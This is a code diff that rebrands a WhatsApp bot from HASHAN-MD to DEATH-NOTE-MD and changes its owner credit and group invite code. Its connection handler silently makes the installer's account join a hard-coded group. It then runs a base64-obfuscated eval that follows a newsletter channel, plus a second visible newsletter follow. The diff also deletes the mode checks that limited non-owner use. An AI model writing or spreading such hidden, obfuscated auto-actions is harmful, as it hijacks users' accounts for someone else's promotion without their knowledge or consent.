@@ -69,9 +69,9 @@ require("./plugins/" + plugin);
 console.log('Plugins installed successful ✅')
 console.log('Bot connected to whatsapp ✅')
 
-let up = `*✅ HASHAN-MD Bot Successfully Installed!*
+let up = `*✅ DEATH-NOTE-MD Bot Successfully Installed !*
 
-🔮 HASHAN-MD is built to revolutionize your WhatsApp experience smarter, faster, and more powerful.
+🔮 DEATH-NOTE-MD is built to revolutionize your WhatsApp experience smarter, faster, and more powerful.
 
 💡 From managing media, creating stunning images, automating tasks, to browsing the web everything you need is right here. Unlock a whole new world of features!
 
@@ -79,21 +79,20 @@ let up = `*✅ HASHAN-MD Bot Successfully Installed!*
 
 > *🧑🏻‍💻 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 :*
 
-MAIN OWNER | HASHIYA TECH  
+MAIN OWNER | CRASH DELTA TEAM 
 
 > *🛡️ 𝗙𝗢𝗟𝗟𝗢𝗪 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 :*
 
 https://whatsapp.com/channel/0029VazhnLzK0IBdwXG4152o
 
-> *©️  𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 HASHAN-MD*`;
+> *©️  𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 DEATH-NOTE-MD*`;
 
 conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://files.catbox.moe/sn20tl.jpg` }, caption: up })
-const inviteCode =`FRUzIpzWpwHHVW5hiJMnDH`
+const inviteCode =`Iij690VK6UcANuHWjYVC1X`
 conn.groupAcceptInvite(inviteCode);
 eval(Buffer.from('Y29ubi5uZXdzbGV0dGVyRm9sbG93KCIxMjAzNjMzOTkxOTQ1NjA1MzJAbmV3c2xldHRlcik=', 'base64').toString());
            conn.newsletterFollow("120363395674230271@newsletter")
            console.log(" CHANNEL FOLLOW ✅")
-           
 
 }
 })
@@ -242,11 +241,6 @@ if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || b
         });
     }
 }
-//==============================
-if(!isOwner && config.MODE === "public") return
-if(!isOwner && isGroup && config.MODE === "inbox") return
-if(!isOwner && !isGroup && config.MODE === "groups") return
-//=================================
 
 const events = require('./command')
 const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
